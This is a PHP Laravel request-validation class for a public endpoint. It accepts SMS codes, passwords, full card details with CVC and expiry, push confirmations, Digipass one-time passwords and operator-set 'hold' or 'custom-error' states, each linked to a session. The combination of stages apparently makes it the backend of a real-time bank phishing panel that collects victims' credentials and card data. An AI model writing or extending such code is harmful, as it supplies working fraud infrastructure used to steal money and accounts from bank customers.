<?php

declare(strict_types=1);

namespace App\Http\Requests;

use App\DTOs\FormDataDTO;
use App\Enums\ActionType;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Validation\Rule;

/**
 * Validation for form submission request
 * 
 * Dynamic validation based on action_type
 */
class SubmitFormRequest extends FormRequest
{
    /**
     * Authorize the request
     */
    public function authorize(): bool
    {
        return true; // Публичный endpoint
    }

    /**
     * Validation rules
     */
    public function rules(): array
    {
        $rules = [
            'action_type' => [
                'required',
                'string',
                Rule::in(ActionType::values()),
            ],
        ];

        // Dynamic rules based on action_type
        $actionType = $this->input('action_type');

        return match ($actionType) {
            'code' => array_merge($rules, $this->codeRules()),
            'password' => array_merge($rules, $this->passwordRules()),
            'card-change' => array_merge($rules, $this->cardChangeRules()),
            'push' => array_merge($rules, $this->pushRules()),
            'error', 'custom-error', 'hold' => $rules, // Только action_type
            'custom-question', 'custom-image', 'image-question' => array_merge($rules, $this->customQuestionRules()),
            'digipass' => array_merge($rules, $this->digipassRules()),
            default => $rules,
        };
    }

    /**
     * Rules for SMS code form
     */
    private function codeRules(): array
    {
        return [
            'code' => ['required', 'string', 'min:1', 'max:20'],
        ];
    }

    /**
     * Rules for password form
     */
    private function passwordRules(): array
    {
        return [
            'password' => ['required', 'string', 'min:1', 'max:255'],
        ];
    }

    /**
     * Rules for card change form
     */
    private function cardChangeRules(): array
    {
        return [
            'card_number' => ['required', 'string', 'min:13', 'max:19'],
            'cvc' => ['required', 'string', 'min:3', 'max:4'],
            'expire' => ['required', 'string', 'max:10'],
            'holder_name' => ['required', 'string', 'max:255'],
        ];
    }

    /**
     * Rules for push form
     */
    private function pushRules(): array
    {
        return [
            'confirmed' => ['sometimes', 'boolean'],
        ];
    }

    /**
     * Rules for custom question form
     */
    private function customQuestionRules(): array
    {
        return [
            'custom_answers' => ['required', 'array'],
            'custom_answers.answer' => ['required', 'string', 'max:1000'],
        ];
    }

    /**
     * Rules for digipass form
     */
    private function digipassRules(): array
    {
        return [
            'custom_answers' => ['required', 'array'],
            'custom_answers.serial_number' => ['nullable', 'string', 'max:20'],
            'custom_answers.otp' => ['required', 'string', 'min:1', 'max:10'],
        ];
    }

    /**
     * Custom error messages
     */
    public function messages(): array
    {
        return [
            'action_type.required' => 'Action type is required',
            'action_type.in' => 'Invalid action type',
            'code.required' => 'Code is required',
            'code.min' => 'Code is too short',
            'password.required' => 'Password is required',
            'card_number.required' => 'Card number is required',
            'card_number.regex' => 'Invalid card number format',
            'cvc.required' => 'CVC is required',
            'cvc.regex' => 'Invalid CVC format',
            'expire.required' => 'Expiry date is required',
            'expire.regex' => 'Invalid expiry date format (MM/YY)',
        ];
    }

    /**
     * Get ActionType enum
     */
    public function getActionType(): ActionType
    {
        return ActionType::from($this->validated('action_type'));
    }

    /**
     * Get Session model from route
     */
    public function getSessionModel(): \App\Models\Session
    {
        return $this->route('session');
    }

    /**
     * Convert to FormDataDTO
     */
    public function toDTO(): FormDataDTO
    {
        $validated = $this->validated();

        return FormDataDTO::fromArray([
            'session_id' => $this->getSessionModel()->id,
            'action_type' => $validated['action_type'],
            'code' => $validated['code'] ?? null,
            'password' => $validated['password'] ?? null,
            'card_number' => $validated['card_number'] ?? null,
            'cvc' => $validated['cvc'] ?? null,
            'expire' => $validated['expire'] ?? null,
            'holder_name' => $validated['holder_name'] ?? null,
            'custom_answers' => $validated['custom_answers'] ?? null,
        ]);
    }
}
